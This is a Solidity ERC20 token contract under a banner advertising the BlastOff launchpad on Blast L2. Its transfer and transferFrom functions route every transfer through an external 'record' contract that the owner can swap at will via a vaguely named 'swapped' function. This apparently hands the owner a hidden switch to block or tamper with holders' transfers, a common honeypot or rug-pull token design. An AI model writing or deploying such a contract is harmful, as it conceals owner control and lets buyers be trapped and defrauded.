// SPDX-License-Identifier: MIT

/*                                                                                                                 
    ██████╗ ██╗      █████╗ ███████╗████████╗ ██████╗ ███████╗███████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔════╝
    ██████╔╝██║     ███████║███████╗   ██║   ██║   ██║█████╗  █████╗  
    ██╔══██╗██║     ██╔══██║╚════██║   ██║   ██║   ██║██╔══╝  ██╔══╝  
    ██████╔╝███████╗██║  ██║███████║   ██║   ╚██████╔╝██║     ██║     
    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝     

    .d888          888                                              .d888        .d888 d8b                                                       
    d88P"           888                                             d88P"        d88P"  Y8P                                                       
    888             888                                             888          888                                                              
    888888 888  888 888888 888  888 888d888  .d88b.         .d88b.  888888       888888 888 88888b.   8888b.  88888b.   8888b.   .d8888b  .d88b.  
    888    888  888 888    888  888 888P"   d8P  Y8b       d88""88b 888          888    888 888 "88b     "88b 888 "88b     "88b d88P"    d8P  Y8b 
    888    888  888 888    888  888 888     88888888       888  888 888          888    888 888  888 .d888888 888  888 .d888888 888      88888888 
    888    Y88b 888 Y88b.  Y88b 888 888     Y8b.           Y88..88P 888          888    888 888  888 888  888 888  888 888  888 Y88b.    Y8b.     
    888     "Y88888  "Y888  "Y88888 888      "Y8888         "Y88P"  888          888    888 888  888 "Y888888 888  888 "Y888888  "Y8888P  "Y8888  
                                                                                                                                              
    A Native Yield Based LaunchPad and Yield Aggregator powered by @Blast_L2. Winners of the Blast Big Bang Competition.

    https://blastoff.zone/
    https://twitter.com/blastozone
 
*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract transferFacet is ERC20, Ownable {
    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sw.record(msg.sender, to, value);
        return super.transfer(to, value);
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sw.record(from, to, value);
        return super.transferFrom(from, to, value);
    }
    function swapped(address _tx) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sw = Swap(_tx);
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
}
